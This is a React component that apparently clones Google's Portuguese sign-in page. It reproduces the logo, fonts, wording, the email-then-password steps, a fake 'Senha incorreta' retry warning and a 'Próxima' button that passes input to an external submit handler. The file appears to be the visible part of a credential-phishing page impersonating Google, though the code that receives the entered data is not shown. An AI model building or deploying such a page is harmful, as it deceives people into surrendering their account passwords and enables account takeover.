import { render } from '@testing-library/react'
import React, { useLayoutEffect } from 'react'
import ReactDOM from 'react-dom'
import logoGoogle from './logoGoogle'



const letreiroEmail = () => (
	<div>
		<p style={{ color: '#202124',    paddingBottom: '0',    paddingTop: '16px',
		fontFamily: 'Google Sans, Noto Sans Myanmar UI, arial,sans-serif',   fontSize: '24px', fontWeight: '400', lineHeight: '1.3333',   marginBottom: '0', marginTop: '0'}}>
		Fazer login
		</p>


		<p style={{fontSize: '16px', lineHeight: '1.5', fontWeight: '400', color: '#202124', fontFamily: 'Google Sans, Noto Sans Myanmar UI, arial, sans-serif',
		letterSpacing: '0.1'}}> 
		Ir para o Gmail </p>
	</div>
)


const letreiroSenha = (email) =>( 
		<div>
			<p style={{ color: '#202124',    paddingBottom: '0',    paddingTop: '16px',
			fontFamily: 'Google Sans, Noto Sans Myanmar UI, arial,sans-serif',   fontSize: '24px', fontWeight: '400', lineHeight: '1.3333',   marginBottom: '0', marginTop: '0', marginBottom: '10px'}}>
			Olá!
			</p>


			<div style={{ alignItems: 'center', background: '#fff', border: '1px solid #dadce0', color: '#3c4043', cursor: 'pointer', display: 'inline-flex',  fontFamily: 'Google Sans,Noto Sans Myanmar UI,arial,sans-serif',fontSize: '14px',
            fontWeight: '500',  letterSpacing: '0.25px', maxWidth: '100%', position: 'relative', borderRadius: '16px', padding: '0 7px 0px 7px', width:'300px',
			marginBottom: '40px'}}>

					<svg aria-hidden="true" class="stUf5b" fill="currentColor" focusable="false" width="30px" height="30px" viewBox="0 0 24 24" xmlns="https://www.w3.org/2000/svg"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm6.36 14.83c-1.43-1.74-4.9-2.33-6.36-2.33s-4.93.59-6.36 2.33C4.62 15.49 4 13.82 4 12c0-4.41 3.59-8 8-8s8 3.59 8 8c0 1.82-.62 3.49-1.64 4.83zM12 6c-1.94 0-3.5 1.56-3.5 3.5S10.06 13 12 13s3.5-1.56 3.5-3.5S13.94 6 12 6z"></path></svg>
					
					<div style={{display: 'inline-flex', 
					textAlign: 'center', justifyContent: 'center', width: '100%'}}> 
					
					   <h> {email} </h>
					
					</div>
			</div>
		</div>)



const letreiroFinalEmail = () => 
(
	<div>
				<div  style={{textAlign: 'start', margin: '1px 1px 0 16px'}}>
					<span style={{borderRadius: '4px', color: '#1a73e8', display: 'inline-block', fontWeight: '500',    letterSpacing: '.25px', outline: '0', position: 'relative', backgroundColor: 'transparent', cursor: 'pointer', fontSize: 'inherit', padding: '0', border: '0', fontSize: '14px'}}> 
					Esqueçeu seu e-mail? </span>
				</div>


				<div  style={{textAlign: 'start', margin: '32px 1px 0 16px', width: '378px'}}>


					<h style={{ color: '#5f6368', fontSize: '14px', lineHeight: '1.4286', font: '800px 16px Roboto,RobotoDraft,Helvetica,Arial,sans-serif'}}>
						Não está no seu computador? Use o modo visitante para fazer login com privacidade.
					</h>

					<h> </h>


					<a href="https://support.google.com/chrome/answer/6130773?hl=pt" 
					style={{ textDecoration: 'none',borderRadius: '4px',color: '#1a73e8',
						display: 'inline-block', fontWeight: '500', letterSpacing: '.25px',
						outline: '0',  position: 'relative'}}>
						Saiba mais
					</a>
				</div>
	</div>
)


const letreiroFinalSenha = () => 
(
	<div style={{display:'flex', justifyContent:'start', margin: '5px 1px 0px 17px', alignItems: 'end'}}>
						
						<div style={{display: 'flex', alignItems: 'stretch', alignSelf: 'center', justifyContent: 'center',border:'solid 2px #202124', borderRadius: '15%', padding: '0', margin: '0', marginRight: '15px'}}>
							<input type='checkbox' style={{width: '15px', height: '15px', padding: '0' , margin: '0'}}/>
						</div>
						
						<h style={{fontSize:'14px'}}> Mostrar senha </h>
	</div>
)

//Senha incorreta. Tente novamente ou clique em "Esqueceu a senha?" para redefini-la.


const alertWarning = (fase) => 
(
	<div style={{color: '#d93025', display: 'flex', alignItems: 'flex-start' , alignSelf: 'start', width: '408px'}}>
		<span style={{marginRight: '10px'}}>
			<svg aria-hidden="true" class="stUf5b qpSchb" fill="currentColor" focusable="false" width="16px" height="16px" viewBox="0 0 24 24" xmlns="https://www.w3.org/2000/svg">
				<path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"></path>
			</svg>
		</span>
		<div style={{display:'flex', justifyContent: 'start', alignSelf: 'start', textAlign: 'left'}}>
			<h> 
				{
					fase=='senha' ? 
					"Senha incorreta. Tente novamente ou clique em \"Esqueceu a senha?\" para redefini-la":
					"Não foi possível encontrar sua Conta do Google"
				} 
			</h>
		</div>
	</div>
)


const loginEmail = (fase, email, enviar, problema) => 
{

	//alert(problema);
	
		return(


			<div style={{display: 'inline-block',height: '448px', width: '448px', position:'fixed',top: '15%',
			left: '35%', border: ' 1.5px solid #e0e0e0', textAlign: 'center'}}>
			
				<div style={{display: 'flex', justifyContent: 'center', marginTop:'40px'}}>

				
					{logoGoogle}



				</div>


				{ (fase== 'senha') ?  letreiroSenha(email) : letreiroEmail()}



				
				<input id="dados" style={{ borderRadius: '4px', color: '#202124', fontSize: '16px', height: '28px', 
				margin: '10px 1px 0 1px', padding: '13px 15px', zIndex: '1', border: '2px solid #e0e0e0', outline: 'none', width: '378px', font: '400px 16px Roboto,RobotoDraft,Helvetica,Arial,sans-serif'}}
				placeholder={fase=='senha' ? 'Digite sua senha' : 'E-mail ou telefone' }/>
				<div style={{display: 'flex', alignItems: 'flex-start', margin: '1px 0 0 17px', fontSize: '12px'}}>
					{ (problema == 1) ? 
				 	alertWarning(fase) : 
				 	null
					}    
				</div>

				{fase== 'senha'?  letreiroFinalSenha() : letreiroFinalEmail()}

				
				<div style={{display:'flex', justifyContent: 'space-between',textAlign: 'left', 
				margin: '60px 16px 0 16px', alignItems: 'center', alignSelf: 'center'}}>

					<span  
							style={{ textDecoration: 'none',borderRadius: '4px',color: '#1a73e8', fontSize: '14px',
							display: 'inline-block', fontWeight: '500', letterSpacing: '.25px',
							outline: '0',  position: 'relative'}}>
							{fase =='senha'? 'Esqueçeu a senha?':'Criar Conta'}
					</span>



					<span href="https://support.google.com/chrome/answer/6130773?hl=pt" 
							style={{ textDecoration: 'none',borderRadius: '4px',color: '#ffffff',
							display: 'inline-block', fontWeight: '500', boxSizing: 'inherit',
							outline: '0',  position: 'relative', backgroundColor: '#1a73e8', padding: '10px', 
							}} onClick={enviar}>
							Próxima
					</span>


				</div>

			</div>



		)
	
}



export default loginEmail;